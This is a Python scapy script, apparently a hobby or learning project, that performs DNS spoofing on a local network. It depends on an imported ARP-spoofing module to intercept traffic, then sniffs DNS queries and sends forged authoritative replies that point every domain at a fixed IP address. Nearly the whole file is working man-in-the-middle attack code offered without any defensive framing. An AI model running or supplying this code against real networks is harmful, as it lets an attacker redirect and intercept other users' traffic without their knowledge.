import scapy.all as scapy
import threading
import arp_spoofing

destination_ip = "142.250.179.174" #what to spoof the ip to (google.com)


dns_spoofing = True #set this to false to stop the thread

#if packet is dns and has qr=0, it is a query
def isDnsQuery(packet):
    return packet.haslayer(scapy.DNS) and packet.getlayer(scapy.DNS).qr == 0


#todo fix this, is just an idea
def dns_spoof(packet):
    if not isDnsQuery(packet):
        # call proxy method
        return
    print("dns lookup packet detected")

    qname = packet[scapy.DNSQR].qname.decode('utf-8') #get the domain name client wants to resolve

    ip_src = packet[scapy.IP].src
    ip_dst = packet[scapy.IP].dst
    udp_sport = packet[scapy.UDP].sport
    udp_dport = packet[scapy.UDP].dport
    dns_id = packet[scapy.DNS].id
    dns_qd = packet[scapy.DNS].qd
        
    #dns record with the destination ip as resolved ip
    dns_rr = scapy.DNSRR(rrname=qname, ttl=10, rdata=destination_ip) #maybe different ip
    

    spoofed_response = scapy.IP(dst=ip_src, src=ip_dst) / \
                       scapy.UDP(dport=udp_sport, sport=udp_dport) / \
                       scapy.DNS(id=dns_id, qr=1, aa=1, qd=dns_qd, an=dns_rr)

    scapy.send(spoofed_response)

def dns_main_loop():
    while dns_spoofing:
        #continuously sniff and respond to dns packets (udp port 53 is used for dns)
        arp_spoofing.arp_main_tick()
        scapy.sniff(filter="udp port 53", prn=dns_spoof, timeout = 5)
    

def dns_main():
    #on a thread we sniff for dns packets and respond with a spoofed response
    arp_spoofing.arp_main_automated()
    #dns_spoofing_thread = threading.Thread(target=dns_main_loop)
    #dns_spoofing_thread.start()
    dns_main_loop()